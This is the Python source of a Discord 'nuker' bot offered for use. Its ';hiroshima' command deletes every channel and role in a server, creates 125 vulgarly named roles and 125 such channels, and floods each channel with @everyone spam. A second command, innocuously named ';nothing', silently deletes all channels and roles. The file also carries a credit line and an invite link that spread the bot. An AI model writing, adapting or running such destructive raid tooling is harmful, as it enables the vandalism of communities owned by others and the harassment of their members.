import discord
from discord.ext import commands
import asyncio
import random
import colorama
import os
from dotenv import load_dotenv
from colorama import Fore, Back, Style, init

init()

load_dotenv()

TOKEN = os.getenv("DISCORD_TOKEN")

intents = discord.Intents.default()
intents.message_content = True
client = commands.Bot(command_prefix = ";", intents = intents)
client.remove_command("help")

# Whitelist for servers where bot is disabled
whitelisted_servers = set()

@client.before_invoke
async def before_invoke(ctx):
    if ctx.guild and ctx.guild.id in whitelisted_servers and ctx.command.name not in ["help", "whitelist"]:
        await ctx.send("server whitelisted. :3")
        raise commands.CheckFailure()

#discord bot's terminal
@client.event
async def on_ready():
    print(f"{Fore.MAGENTA}██╗      ██████╗ ██╗   ██╗███████╗██╗      █████╗  ██████╗███████╗")
    print(f"{Fore.MAGENTA}██║     ██╔═══██╗██║   ██║██╔════╝██║     ██╔══██╗██╔════╝██╔════╝")
    print(f"{Fore.MAGENTA}██║     ██║   ██║██║   ██║█████╗  ██║     ███████║██║     █████╗")
    print(f"{Fore.MAGENTA}██║     ██║   ██║╚██╗ ██╔╝██╔══╝  ██║     ██╔══██║██║     ██╔══╝")
    print(f"{Fore.MAGENTA}███████╗╚██████╔╝ ╚████╔╝ ███████╗███████╗██║  ██║╚██████╗███████╗")
    print(f"{Fore.MAGENTA}╚══════╝ ╚═════╝   ╚═══╝  ╚══════╝╚══════╝╚═╝  ╚═╝ ╚═════╝╚══════╝")
    print(f"{Fore.MAGENTA}[1] ;hiroshima - Nukes [2]       |       [2] ;help - Displays This")
    print(f"{Fore.MAGENTA}------------------------------------------------------------------")
    print(f"{Fore.MAGENTA}[3] ;credits - Shows My Socials  |     [4] ;nothing - nothing left")

@client.command()
async def hiroshima(ctx):
    await ctx.send("**If you've never seen a massacre, this is what it looks like.**")
    guild = ctx.guild
    
    # Delete all channels concurrently
    delete_channels = []
    for channel in list(guild.channels):
        delete_channels.append(asyncio.create_task(channel.delete()))
    if delete_channels:
        results = await asyncio.gather(*delete_channels, return_exceptions=True)
        failed = sum(1 for r in results if isinstance(r, Exception))
        if failed > 0:
            print(f"  DELETING CHANNELS: {failed} FAILED")
    
    # Delete all roles concurrently
    delete_roles = []
    for role in list(guild.roles):
        if role.name != "@everyone":
            delete_roles.append(asyncio.create_task(role.delete()))
    if delete_roles:
        results = await asyncio.gather(*delete_roles, return_exceptions=True)
        failed = sum(1 for r in results if isinstance(r, Exception))
        if failed > 0:
            print(f"  DELETING ROLES: {failed} FAILED")
    
    # Create roles concurrently
    create_roles = [guild.create_role(name="Fucked By blossom.") for _ in range(125)]
    await asyncio.gather(*create_roles, return_exceptions=True)
    
    # Create channels concurrently
    create_channels = [guild.create_text_channel(name="Fucked By blossom.") for _ in range(125)]
    channels = await asyncio.gather(*create_channels, return_exceptions=True)
    channels = [c for c in channels if not isinstance(c, Exception)]
    
    # Send messages concurrently
    if channels:
        messages = []
        for channel in channels:
            for _ in range(5):
                messages.append(channel.send("@everyone Server Just Got Fucked By blossom."))
        await asyncio.gather(*messages, return_exceptions=True)  

@client.command()
async def help(ctx):
    messages = [
        ctx.send("**[1] ;hiroshima - Nukes [2]            |        [2] ;help - Displays This**"),
        ctx.send("**-------------------------------------------------------------------------**"),
        ctx.send("**[3] ;credits - Shows My Socials  |     [4] ;nothing - nothing left**")
    ]
    await asyncio.gather(*messages)

@client.command()
async def credits(ctx):
    await ctx.send("**Bot created by 6syj on discord**")
    await ctx.send("**Get bot here: .gg/a6PrNZDP57**")

@client.command()
async def whitelist(ctx, action: str, guild_id: int = None):
    if action.lower() == "add":
        if guild_id is None:
            guild_id = ctx.guild.id
        whitelisted_servers.add(guild_id)
        await ctx.send(f"✅ Server `{guild_id}` has been whitelisted. Bot is now disabled there.")
    elif action.lower() == "remove":
        if guild_id is None:
            guild_id = ctx.guild.id
        whitelisted_servers.discard(guild_id)
        await ctx.send(f"✅ Server `{guild_id}` has been removed from whitelist.")
    elif action.lower() == "list":
        if whitelisted_servers:
            await ctx.send(f"**Whitelisted servers:** {', '.join(str(g) for g in whitelisted_servers)}")
        else:
            await ctx.send("**No whitelisted servers.**")
    else:
        await ctx.send("Usage: `;whitelist add [guild_id]`, `;whitelist remove [guild_id]`, or `;whitelist list`")

@client.command()
async def nothing(ctx):
    guild = ctx.guild
    
    # Delete all channels concurrently
    delete_channels = []
    for channel in list(guild.channels):
        delete_channels.append(asyncio.create_task(channel.delete()))
    if delete_channels:
        results = await asyncio.gather(*delete_channels, return_exceptions=True)
        failed = sum(1 for r in results if isinstance(r, Exception))
        if failed > 0:
            print(f"  DELETING CHANNELS: {failed} FAILED")
    
    # Delete all roles concurrently
    delete_roles = []
    for role in list(guild.roles):
        if role.name != "@everyone":
            delete_roles.append(asyncio.create_task(role.delete()))
    if delete_roles:
        results = await asyncio.gather(*delete_roles, return_exceptions=True)
        failed = sum(1 for r in results if isinstance(r, Exception))
        if failed > 0:
            print(f"  DELETING ROLES: {failed} FAILED")

client.run(TOKEN)
